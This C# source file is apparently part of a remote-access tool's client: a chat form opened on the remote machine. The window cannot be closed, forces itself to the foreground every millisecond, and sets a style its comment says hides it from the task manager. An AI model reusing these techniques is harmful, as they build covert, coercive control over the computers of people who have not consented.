using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Forms
{
    public partial class FrmRemoteChat : Form
    {
        private Client _connectedClient;

        public FrmRemoteChat(Client client)
        {
            this._connectedClient = client;
            InitializeComponent();

        }

        public void AddMessage(string sender, string message)
        {
            txtMessages.AppendText(string.Format("{0} {1}: {2}{3}", DateTime.Now.ToString("HH:mm:ss"), sender, message, Environment.NewLine));
        }

        private void FrmRemoteChat_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void StartKeepingTopMost()
        {
            (new Thread(() => 
            {
                while (Visible)
                {
                    NativeMethods.SetForegroundWindow(Handle);
                    Thread.Sleep(1);
                }
            })).Start();
        }

        /// <summary>
        /// Method used for hiding the form from task manager
        /// </summary>
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        private void FrmRemoteChat_Shown(object sender, EventArgs e)
        {
            StartKeepingTopMost();
            txtMessage.Focus();
        }

        private void FrmRemoteChat_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                NativeMethods.ReleaseCapture();
                NativeMethods.SendMessage(Handle, NativeMethods.WM_NCLBUTTONDOWN, NativeMethods.HT_CAPTION, 0);
            }
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            if(txtMessage.Text.Trim() != "")
            {
                new xClient.Core.Packets.ServerPackets.DoChatMessage(txtMessage.Text.Trim()).Execute(_connectedClient);
                AddMessage("Me", txtMessage.Text.Trim());
                txtMessage.Text = "";
                txtMessage.Focus();
            }
        }
    }
}
